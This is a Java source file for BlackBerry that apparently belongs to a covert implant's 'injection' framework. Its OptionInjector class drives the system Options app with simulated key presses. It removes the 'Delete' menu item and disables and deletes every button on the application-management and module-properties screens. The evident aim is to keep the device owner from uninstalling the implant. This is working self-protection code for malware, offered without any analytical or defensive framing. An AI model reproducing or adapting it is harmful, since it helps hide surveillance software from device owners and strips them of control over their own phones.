package blackberry.injection.injectors;

import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.FieldChangeListener;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Manager;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.component.ButtonField;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.KeyInjector;
import blackberry.injection.MenuWalker;
import blackberry.utils.Utils;

public class OptionInjector extends AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("OptionInjector", DebugLevel.VERBOSE);

    //#endif

    public String getAppName() {
        return "Options";
    }

    public String getCodName() {
        return "net_rim_bb_options_app";
    }
    
    public void injected(){
        Utils.sleep(500);
        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
        Utils.sleep(500);
        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
    }

    public String[] getWantedScreen() {
        // lo screen: AppMgmtScreen
        // i dettagli: ModulePropertiesScreen
        // gruppo: ModuleGroupPropertiesScreen
        return new String[] { "AppMgmtScreen", "ModulePropertiesScreen",
                "ModuleGroupPropertiesScreen" };
    }

    public void playOnScreen(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen: " + getInjectedApp());
        debug.led(Debug.COLOR_RED);
        //#endif

        String screenName = screen.getClass().getName();

        synchronized (getInjectedApp().getAppEventLock()) {
            MenuWalker.deleteMenu(screen, "Delete");
            if (screenName.endsWith("AppMgmtScreen")) {

            } else if (screenName.endsWith("ModulePropertiesScreen")
                    || screenName.endsWith("ModuleGroupPropertiesScreen")) {

                Field field = screen.getFieldWithFocus();
                //#ifdef DEBUG
                debug.trace("playOnScreen, focus field: " + field);
                //#endif

                final FieldChangeListener listener = new FieldChangeListener() {
                    public void fieldChanged(Field field, int context) {
                        ButtonField buttonField = (ButtonField) field;
                        debug.trace("Button pressed: " + buttonField.getLabel());
                    }
                };

                for (int i = 0; i < screen.getFieldCount(); i++) {
                    Field fieldi = screen.getField(i);
                    //#ifdef DEBUG
                    debug.trace("playOnScreen, field " + i + " : " + fieldi);
                    //#endif
                    traverseField(fieldi, 0, new FieldChangeListener() {
                        public void fieldChanged(Field field, int deep) {
                            String tab = "";
                            for (int i = 0; i < deep; i++) {
                                tab += " ";
                            }
                            
                            //#ifdef DEBUG
                            debug.trace("fieldChanged"+ tab + " field : "+field);
                            //#endif
                            if (field instanceof ButtonField) {
                                ButtonField bf = (ButtonField) field;
                                //if (bf.getLabel().indexOf("Delete") >= 0) {
                                bf.setVisualState(ButtonField.VISUAL_STATE_DISABLED);
                                debug.trace("fieldChanged"+ tab + " button : "+bf.getVisualState() + " label: " + bf.getLabel()+ " state: " +bf.getFieldStyle());
                                bf.getManager().delete(bf);
                                
                            }
                            
                        }
                    });

                }

            }
        }

    }

    private void traverseField(Field field, int deep,
            FieldChangeListener fieldChangeListener) {

        fieldChangeListener.fieldChanged(field, deep);
        if (field instanceof Manager) {
            Manager vf = (Manager) field;
            for (int i = 0; i < vf.getFieldCount(); i++) {
                traverseField(vf.getField(i), deep + 1, fieldChangeListener);
            }
        }

    }

    public boolean execute(String codName) {
        //#ifdef DEBUG
        debug.trace("execute Schedule: " + codName);
        //Backlight.enable(true);
        //#endif
        if (executeSchedule(codName)) {
            KeyInjector.trackBallDown(1);
            Utils.sleep(200);
            KeyInjector.pressKey(Keypad.KEY_ENTER);
            Utils.sleep(200);
            KeyInjector.pressKey(Keypad.KEY_ENTER);
            Utils.sleep(200);
            return true;
        }
        return false;
    }

}
